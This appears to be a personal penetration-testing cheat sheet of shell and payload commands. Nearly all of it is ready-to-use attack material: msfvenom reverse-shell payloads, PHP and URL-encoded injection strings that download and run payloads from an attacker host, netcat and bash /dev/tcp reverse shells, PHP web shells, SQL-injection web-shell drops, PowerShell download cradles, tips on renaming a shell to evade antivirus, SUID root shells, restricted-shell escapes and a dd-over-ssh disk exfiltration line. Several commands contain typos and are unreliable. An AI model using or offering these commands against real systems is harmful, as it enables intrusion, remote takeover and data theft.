xfreerdp h:/1000 /drive:/home/kali/tools


Interactive TTY Shell
# python
python -c 'import pty; pty.spawn("/bin/sh")'
stty raw -echo ; fg ; reset - helps to stay in terminal when we hit ctrl+c
rlwrap nc -vnlp 9001 -- this tool is to use up/down/ arrows in the shell
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
stty columns 200 rows 200

---------------------------------------------------------------------------------------------------------------

First (Msfvenom Payload)

#Create payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf#Wget into /tmp (Url Encoded)
' and die(system("wget 'http://<ip>/shell.elf' -O /tmp/shell.elf")) or '#Run while use multi/handler
' and die(system("/tmp/shell.elf")) or '

-----------------------------------------------------------

Second (Curl Php)

#Create a php reverse shell (shell.php)
<?php
    system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.142 9001 >/tmp/f');
?>#Curl and listen (Url Encoded)
' and die(system("curl http://<ip>/shell.php|php")) or '

-----------------------------------------------------

PHP
<?php system($_GET["cmd"]); ?>
<?php echo shell_exec($_GET["cmd"]); ?>

#Simple php revers shell.  -e option if you don't have a working /bin/sh. -c string specify shell commands to exec after connect


<?php
system('nc.exe -e cmd.exe attacker_ip 4444')
?>

-----------------------------------------------------
Reverse Shell 

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 

https://www.revshells.com/

-----------------------------------------------------

Msfvenom
#Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f elf > shell.elf
# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f raw > shell.php
# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f asp > shell.asp
# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f war > shell.war
# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f raw > shell.jsp
# Exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=445 -f exe -o shell_reverse.exe



msfvenom -p windows/x64/reverse_tcp --platform windows -a x86 -f exe lhost=192.168.1.101 lport=4444 -a /root/somewhere/hack.exe

msfpayload windows/x64/meterpreter_tcp lhost=192.168.1.101 lport=4444 x > /root/somewhere/hack.exe
use exploit/multi/handler
set payload windows/x64/meterpreter_tcp
set lhost 192.168.1.101
se lport 4444
show targets
set target x
run
----------------------------------------------------


echo 'os.system('/bin/bash')'
/bin/sh -i
/bin/bash -i

-----------------------------------------------------

Shell From SQL Injection
# windows
?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
# linux
?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'

---------------------------------------------------------

Misc
# Method of copying a file on windows mashine|
                                   
IEX(New-Object Net.WebClient).downloadstring(\"http://attacker_ip/shell.ps1\")
iwr -UseBasicParsing -Uri http://attacker_ip/pr.exe OutFile 'the_path_where_you_want_to_store_your_pr.exe'
certutil -urlcache -split -f http://attacker_ip


# Revers shell on on windows server.

On server do below:
5. IEX(New-Object Net.WebClient).downloadString("http://10.10.10.10/rev.ps1")
6. run hackerzzz 10.10.10.10

On attacker side:

1. Download reverse shell ConPtyShell(in this shell find and rename Invoke-ConPtyShell into hackerzzz as AV will detect this file, also rename any ConPtyShell to hackerzzz)
2. Name it as rev.ps1
3. Run local Simple http server and copy in www this rev.ps1
4. Also run stty raw -echo; (stty size; cat) | nc -lvnp 9001

then from reversshell's console type: wget http://10.10.10.10/winpeas.exe  for local enumeration

Any questions look for acute for ippsec.rocks.
-------------------------------------------------------

On compromised windows box we got a web shell. In order to get a reverse shell execute in webshell the commands below(on attacker side run local listner):
powershell wget -Uri http://attacker_ip/nc.exe -OutFile C:\windows\temp\nc.exe
C:\windows\temp\nc.exe -e cmd.exe attacker_ip 4446

--------------------------------------------------------

Side note: 
check for /bin/dash
Bash likes to drop setuid permissions but Dash will not

## Repo of shells you can upload 
https://github.com/tennc/webshell
```
git clone https://github.com/tennc/webshell.git
```

# Search for Commands that run as Root:
## list all programs this account has sudo access to
```
sudo -l
```

## find all files with SUID & SGID set
```
find . -perm /2000 
find / -perm -4000 -o -perm -2000
find / -perm -u=s -type f 2>/dev/null
find / -perm /6000
find / -perm /6001   
```


## Restricted Shells: rbash, rksh, rzsh, lshell and rssh
1. try ls, cd, pwd, echo commands [if these commands are restricted, 
   an error will show up with the type of restricted shell we are in (most of the time, this is rbash)]
2. press tab twice to see what commands are available.
  a. if "ls" is avaiable list binaries in /bin, /usr/bin, /usr/local/bin
  b. echo /usr/bin/*  [use globbing to list directory contents]
  c. important to check for operators and escape characters such as the following:
  ```
     > >> < | & ; : ' " `
  ```
3. Try commands wrapped
```
(whoami)
{whoami}
```

## Shell Execution:
```
find /home -exec sh -i \;
```
## use text editors vim, vi, nano, pico, ed
```
:!/bin/sh, !/bin/zsh, try other shells!?!?
:shell
:set shell=/bin/sh
:set shell=/bin/bash:shell
:!bash
```

## use pagers less, more, or programs like man that use less or more by default
```
!/bin/sh, !/bin/zsh, try other shells!?!?
!/bin/bash
!bash
```

## find
use find command’s exec parameter for code execution (returns shell)
```
sudo find /home -exec sh -i \;
find /var/log -name messages -exec /bin/bash -i \;
```

## use awk command
```
awk 'BEGIN {system("/bin/sh")}'
```

## use expect command
```
expect
spwan sh
sh
```

## use tee command to create a script in scenarios where text editors aren't available
```
echo "bash -i" | tee script.sh
```

## use nmap command
```
nmap --interactive
nmap> !sh
```

## use ssh with the following options to escape restricted shell 
```
ssh user@IP -t "bash --noprofile"
ssh user@IP -t "/bin/sh"
```

## Reverse Shell:

```
bash -i >& /dev/tcp/<ip-address>/<port> 0>&1
```

# Programming Language:
## Python:
```
import os; os.system("/bin/sh")
```
```
python -c 'import pty; pty.spawn("/bin/sh")'
```
```
import os; os.system("/bin/bash")
```
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## PHP:
```
exec("sh -i");
```

## PHP Webshell:
```
<?php
  $command = $_GET['cmd'];
  echo system($command);
?>
```
usage examples
```
url/webshell.php?cmd=ls
```

## PHP Webshell
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files
```
<?php
    if ($_SERVER['REMOTE_HOST'] === "FIXME") { // Set your IP address here
        if(isset($_REQUEST['cmd'])){
            $cmd = ($_REQUEST['cmd']);
            echo "<pre>\n";
            system($cmd);
            echo "</pre>";
        }
    }
?>
```
Once the shell is uploaded (with a random name), you can execute operating system commands by passing them in the cmd GET parameter:
```
https://example.org/7sna8uuorvcx3x4fx.php?cmd=cat+/etc/passwd
```

## Perl:
```
exec "/bin/sh";
```
```
perl —e 'exec "/bin/sh";'
```
```
exec "/bin/bash";
```
```
perl —e 'exec "/bin/bash";'
```

## Ruby:
```
exec "/bin/sh"
```
```
ruby -e 'exec "/bin/sh"'
```
```
exec "/bin/bash"
```
```
ruby -e 'exec "/bin/bash"'
```

## IRB:
```
exec "/bin/sh"
```

## Lua:
```
os.execute("/bin/sh")
```

## C:
```
#include <stdio.h>

int main(int argc, char **argv)
{
	int status = system(bash);
	return 0;
}
```
```
int main(void){
    setresuid(0, 0, 0);
    system("/bin/bash");
}
```
```
int main(void){
       setresuid(0, 0, 0);
       system("/bin/sh");
}       
```

### Building the SUID Shell binary
```
gcc -o suid suid.c 
gcc -o exploit exploit.c
``` 

### For 32 bit:
```
gcc -m32 -o suid suid.c  
gcc -m32 exploit.c -o exploit
```

### Compile Windows .exe on Linux
Build / compile windows exploits on Linux, resulting in a .exe file.
```
i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
```


# Encrypted exfil channel:
```
dd if=/dev/<disk-to-copy> bs=65536 conv=noerror, sync | ssh -C <user>@<ip-address> "cat > /tmp/image.dd"
```

